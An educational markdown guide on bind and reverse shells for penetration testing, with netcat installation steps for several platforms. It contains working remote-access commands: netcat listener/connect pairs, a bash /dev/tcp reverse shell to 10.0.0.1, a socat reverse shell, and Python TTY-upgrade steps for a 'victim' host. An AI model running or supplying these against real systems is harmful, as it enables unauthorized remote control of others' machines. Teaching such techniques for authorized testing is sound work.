### Shells (Hack Responsibly)

## Introduction
Gaining a shell on your attack system is the ultimate goal , this way the impact of the vulnerability can be stressed.

According to wiki "a shell is a computer program which exposes an operating system's services to a human user or other programs.". now let's think of it this way , say you want total control of a system, you want to be able to switch it on , use it's camera , transfer its file and so on. the easiest way this could be done is to have physical access to the device. Another way, is to be able to control this system in question remotely (you can stay in your office in another country and access your files and computer usage from home).
A malicious attacker with unauthorized access with unauthorized access may also be able to do .if your system is compromised , just like you they dont have to be in thesame physical location to do this.
Now most of the time this compromise happens. the attacker access and controls your computer by typing commands through this shell, which in turn takes these commands typed and execute accordingly (most of the time, sometimes it asks if you are allowed to execute these commands).
An example of this is typing "shutdown now" on your unix system and watch your computer literaly shutdown, you dont have to press any button or click any beautiful GUI for this to happen, just a coomand lets it. i think i've explained this as best as i can .[check this wikipedia for more detailed explanation](https://en.wikipedia.org/wiki/Shell_(computing))



## Executing Shell

There are two ways to access a shell (bind shell and reverse shell)
1. you connect to the computer in question (bind)
2. the computer connects to you (reverse)

**The Bind shell** is rarely used in practice, due to firewalls that restricts imbound connection . dynamic IP addresses etc . In the case of a bind shell you make a connection to the user , that means the user has to be waiting (listening ) for connection and you connect to it. for this to work you will need the IP address of the system and the port you want to make connection to . note: once the IP address changes there is no way for you to access the system unless ofcourse you find its new IP

## Using Netcat for a bind shell 
First we need to install netcat.

### 🔌 Installing Netcat (`nc`) on Android, Windows, and Linux

Netcat (often abbreviated as `nc`) is a powerful network tool used for reading from and writing to network connections using TCP or UDP.

---

### 📱 Android

#### Option 1: Using Termux (Recommended)
1. Install [**Termux**](https://f-droid.org/en/packages/com.termux/) from F-Droid.
2. Run the following commands in Termux:
   ```bash
   pkg update
   pkg install netcat
✅ Netcat will be installed as nc.

####  Option 2: Using BusyBox (Root Required)
1. Install BusyBox from Play Store or F-Droid.

2. Open a terminal emulator or ADB shell:

   ```bash
   busybox nc


### 🪟 Windows

#### Option 1: Using Nmap's Ncat
1. Download and install Nmap from https://nmap.org/download.html.

2. Use Ncat (a Netcat-compatible tool) from the command line:
   ```powershell
   ncat.exe -l -p 4444
   
### Option 2: Standalone Netcat Binary
1. Download from a trusted source like https://eternallybored.org/misc/netcat/
2. Extract and run from Command Prompt:
   ```cmd
   nc.exe -l -p 4444
   
###🐧 Linux
1. Debian/Ubuntu-based:
   ```bash
   sudo apt update
   sudo apt install netcat
2. Arch-based:
   ```bash
    sudo pacman -S gnu-netcat

3. RHEL/CentOS/Fedora:

   ```bash
   sudo dnf install nmap-ncat
#### ✅ Verify Installation
1. Run one of the following commands:
   ```bash
   nc --version
#### or
    ```bash
    ncat --version

#### ℹ️ Note: Depending on your OS and install method, the command may be nc, netcat, or ncat.

    ```vbnet
    Feel free to open an issue or PR if you encounter platform-specific differences!


  ## Using Netcat for a bind shell
     Attacker's Host: nc <IP> <port> # makes connection to remote machine (looks for machine with that IP and has that port opened and makes a connection to it)
     Remote Machine: nc -nvlp <IP> # listens for connection (waits for someone to connect to its machine through that port)
  ## Using Netcat for a reverse shell
      Attacker's Host: nc -nlvp <PORT> # The attacker waits for the host to connect to its own machine , in this case its the one listening for connection)
      Remote Machine: nc <IP> <PORT> # Remote machine has the IP address of the attacker and makes connection to it ( well the attacker has a static IP that wont be chabging anytime soon)
      Or :bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
    
 PS: Only netcat is mentioned here , there are tons of tools to make reverse connection [check payloadallthethings for reverse shell with other tools ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
     

### Shell Codes
  Describe code executed by a target program due to a vulnerability exploit and used to open a remote shell 
  

### Upgrading Simple Shells to Fully Interactive TTYs
using python

  on victim:
     
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    
    (press on your keyboard) Ctrl+Z

    (press on your keyboard) Enter

   on your local host: stty raw -echo

   on your local host:
   
      fg (you will not see your keystrokes -- trust yourself and hit Enter)

      (press on your keyboard) Enter

      (press on your keyboard) Enter

   on the victim: 
   
      export TERM=xterm

  
    
 using socat:
 on host(attacker):
 
    socat file:`tty`,raw,echo=0 tcp-listen:4444
  
 on victim :
 
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
  
    
    
  
